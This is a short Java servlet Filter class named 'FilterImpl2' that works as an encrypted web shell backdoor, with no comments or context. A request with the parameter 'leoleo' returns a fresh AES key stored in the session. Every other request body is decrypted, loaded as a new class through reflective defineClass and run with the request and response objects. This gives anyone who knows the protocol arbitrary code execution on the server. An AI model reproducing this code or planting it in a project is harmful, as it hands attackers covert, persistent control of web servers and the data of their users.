package com.xhstormr.app;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.UUID;

public class FilterImpl2 extends ClassLoader implements Filter {

    public FilterImpl2() {
        super(Thread.currentThread().getContextClassLoader());
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            HttpServletRequest req = (HttpServletRequest) request;
            HttpServletResponse rsp = (HttpServletResponse) response;
            HttpSession session = req.getSession();

            if (req.getParameter("leoleo") != null) {
                String key = UUID.randomUUID().toString().replace("-", "").substring(16);
                session.setAttribute("u", key);
                rsp.getWriter().print(key);
                return;
            }

            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(session.getAttribute("u").toString().getBytes(), "AES"));
            byte[] bytes = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));

            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(new FilterImpl2(), bytes, 0, bytes.length);

            clazz.newInstance().equals(new Object[]{req, rsp});
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }

        chain.doFilter(request, response);
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }
}
